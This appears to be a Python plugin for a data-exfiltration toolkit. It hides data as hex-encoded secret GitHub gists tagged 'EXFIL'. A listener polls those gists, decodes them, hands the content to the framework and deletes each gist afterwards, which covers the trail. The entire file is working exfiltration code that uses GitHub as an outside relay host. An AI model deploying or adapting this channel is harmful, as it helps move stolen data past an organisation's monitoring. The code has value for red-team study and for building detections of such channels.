from binascii import hexlify, unhexlify
import github
import time
import requests

app_exfiltrate = None
client = None

def send(data):
    app_exfiltrate.log_message('info', "[github] Sending {} bytes with Github".format(len(data)))
    client.get_user().create_gist(False, {'foobar.txt': github.InputFileContent(hexlify(data.encode()).decode())}, 'EXFIL')

def listen():
    app_exfiltrate.log_message('info', "[github] Checking for Gists")
    try:
        while True:
            gists = list(client.get_user().get_gists())
            for gist in gists[::-1]:
                if gist.description == 'EXFIL':
                    url = gist.files['foobar.txt'].raw_data['raw_url']
                    req = requests.get(url)
                    content = req.content
                    try:
                        content = unhexlify(content.strip()).decode()
                        app_exfiltrate.log_message('info', "[github] Receiving {} bytes within Gist".format(len(content)))
                        app_exfiltrate.retrieve_data(content)
                    except Exception as err:
                        # print(err)
                        pass
                    finally:
                        gist.delete()
            time.sleep(5)
    except github.GithubException:
        print("GitHub Rate Limit Exceeded")

class Plugin:
    def __init__(self, app, conf):
        global app_exfiltrate, client
        client = github.Github(conf['username'], conf['token'])
        app.register_plugin('github_gist', {'send': send, 'listen': listen})
        app_exfiltrate = app
